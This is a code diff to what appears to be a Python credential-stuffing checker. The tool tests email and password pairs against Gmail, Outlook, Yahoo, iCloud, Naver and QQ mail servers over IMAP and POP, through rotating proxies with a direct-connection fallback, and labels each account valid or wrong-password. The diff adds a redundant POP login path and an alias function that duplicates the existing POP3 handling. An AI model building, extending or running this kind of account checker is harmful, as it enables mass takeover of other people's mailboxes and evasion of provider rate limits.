@@ -796,14 +796,12 @@ def is_disposable(email):
         return False
 
 def check_domain_resolvable(domain):
-    """Fix 2: Pre-Check DNS Validation filtering out non-existent domains ([Errno -2] / [Errno -5])"""
     with cache_lock:
         if domain in domain_cache and "resolvable" in domain_cache[domain]:
             return domain_cache[domain]["resolvable"]
 
     resolvable = False
     try:
-        # Print target hostname right before connection check / lookup per instructions
         print(f"[DNS PRE-CHECK] Validating hostname resolution for domain: {domain}")
         if dns:
             try:
@@ -969,17 +967,17 @@ if raw_text:
     col_m6.metric("Custom Filtered", custom_skipped)
     col_m7.metric("DNS Failed", dns_skipped)
 
-# --- Checking Protocol Functions ---
+# --- Checking Protocol Functions (IMAP, POP, POP3 Pattern Integration) ---
 PROVIDER_MAP = {
-    "gmail.com": {"imap": ["imap.gmail.com"], "pop3": ["pop.gmail.com"]},
-    "googlemail.com": {"imap": ["imap.gmail.com"], "pop3": ["pop.gmail.com"]},
-    "outlook.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
-    "hotmail.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
-    "live.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
-    "yahoo.com": {"imap": ["imap.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
-    "icloud.com": {"imap": ["imap.mail.me.com"], "pop3": ["pop.mail.me.com"]},
-    "naver.com": {"imap": ["imap.naver.com"], "pop3": ["pop.naver.com"]},
-    "qq.com": {"imap": ["imap.qq.com"], "pop3": ["pop.qq.com"]}
+    "gmail.com": {"imap": ["imap.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
+    "googlemail.com": {"imap": ["imap.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
+    "outlook.com": {"imap": ["outlook.office365.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "hotmail.com": {"imap": ["outlook.office365.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "live.com": {"imap": ["outlook.office365.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
+    "yahoo.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
+    "icloud.com": {"imap": ["imap.mail.me.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
+    "naver.com": {"imap": ["imap.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
+    "qq.com": {"imap": ["imap.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]}
 }
 
 PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())
@@ -998,7 +996,7 @@ def get_servers(email):
     try:
         domain = email.split("@")[-1].lower().strip()
         if domain in ZERO_ACCESS_PROVIDERS:
-            return {"imap": [], "pop3": [], "type": "zero_access"}
+            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
         
         with cache_lock:
             if domain in domain_cache and "imap" in domain_cache[domain]:
@@ -1008,32 +1006,39 @@ def get_servers(email):
             return PROVIDER_MAP[domain]
 
         mx = get_mx_hosts(domain)
-        servers = {"imap": [], "pop3": []}
+        servers = {"imap": [], "pop": [], "pop3": []}
         
         for m in mx:
             if "google" in m or "gmail" in m:
                 servers["imap"].append("imap.gmail.com")
+                servers["pop"].append("pop.gmail.com")
                 servers["pop3"].append("pop.gmail.com")
             elif "outlook" in m or "protection.outlook" in m:
                 servers["imap"].append("outlook.office365.com")
+                servers["pop"].append("outlook.office365.com")
                 servers["pop3"].append("outlook.office365.com")
             elif "yahoo" in m:
                 servers["imap"].append("imap.mail.yahoo.com")
+                servers["pop"].append("pop.mail.yahoo.com")
                 servers["pop3"].append("pop.mail.yahoo.com")
             else:
                 servers["imap"].append(m)
+                servers["pop"].append(m)
                 servers["pop3"].append(m)
 
         servers["imap"].extend([f"mail.{domain}", domain])
+        servers["pop"].extend([f"mail.{domain}", domain])
         servers["pop3"].extend([f"mail.{domain}", domain])
         
         servers["imap"] = list(dict.fromkeys(servers["imap"]))
+        servers["pop"] = list(dict.fromkeys(servers["pop"]))
         servers["pop3"] = list(dict.fromkeys(servers["pop3"]))
         
         with cache_lock:
             if domain not in domain_cache:
                 domain_cache[domain] = {}
             domain_cache[domain]["imap"] = servers["imap"]
+            domain_cache[domain]["pop"] = servers["pop"]
             domain_cache[domain]["pop3"] = servers["pop3"]
         save_domain_cache()
         return servers
@@ -1041,7 +1046,8 @@ def get_servers(email):
         warnings.warn(f"Error resolving servers for {email}: {e}")
         d = email.split('@')[-1] if '@' in email else 'localhost'
         return {
-            "imap": [f"mail.{d}", d], 
+            "imap": [f"mail.{d}", d],
+            "pop": [f"mail.{d}", d],
             "pop3": [f"mail.{d}", d]
         }
 
@@ -1074,7 +1080,6 @@ def precheck_proxy_fast(proxy_str):
         return False
 
 def proxy_connect(host, port, proxy_str, timeout=None):
-    """Fix 1: Implement Direct Connection Fallback and catch proxy connection exceptions."""
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
     try:
         with proxy_lock:
@@ -1124,7 +1129,6 @@ def proxy_connect(host, port, proxy_str, timeout=None):
                     pass
                 sock = None
 
-    # Automatic Direct Connection Fallback if proxy routing fails
     try:
         warnings.warn(f"All proxy routes failed for {host}:{port}. Initiating direct fallback connection.")
         direct_sock = socket.create_connection((host, port), timeout=effective_timeout)
@@ -1135,7 +1139,6 @@ def proxy_connect(host, port, proxy_str, timeout=None):
         raise RuntimeError(f"Proxy and direct fallback connection both failed: {direct_ex}")
 
 def ssl_wrap(sock, host, insecure=False):
-    """Fix 3: Hardened SSL Wrapper checking valid file descriptors within try...finally blocks to prevent Bad File Descriptor errors."""
     if sock is None:
         raise RuntimeError("SSL wrap failed completely: socket is None")
     
@@ -1284,6 +1287,10 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
                 pass
         raise e
 
+def pop3_once(email, password, server, proxy_str=None, insecure=False):
+    """Explicit alias and handler following the IMAP, POP, POP3 pattern."""
+    return pop_once(email, password, server, proxy_str=proxy_str, insecure=insecure)
+
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     for h in hosts:
         try:
@@ -1415,10 +1422,24 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"IMAP {server} -> {st_val}", current_px, trace_logs
 
+            for server in conf.get("pop", [])[:3]:
+                trace_logs.append(f"Attempting POP -> Host: {server}:995")
+                try:
+                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
+                    record_proxy_attempt(current_px, success=True)
+                    return server, "valid", f"POP | Host: {server} | Port: 995", current_px, trace_logs
+                except Exception as e:
+                    st_val = classify_error(str(e), domain)
+                    is_net = (st_val == "connection_failed")
+                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
+                    trace_logs.append(f"-> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
+                    if st_val in ("wrong_password", "need_app_password"):
+                        return None, st_val, f"POP {server} -> {st_val}", current_px, trace_logs
+
             for server in conf.get("pop3", [])[:3]:
                 trace_logs.append(f"Attempting POP3 -> Host: {server}:995")
                 try:
-                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
+                    pop3_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
                     return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px, trace_logs
                 except Exception as e:
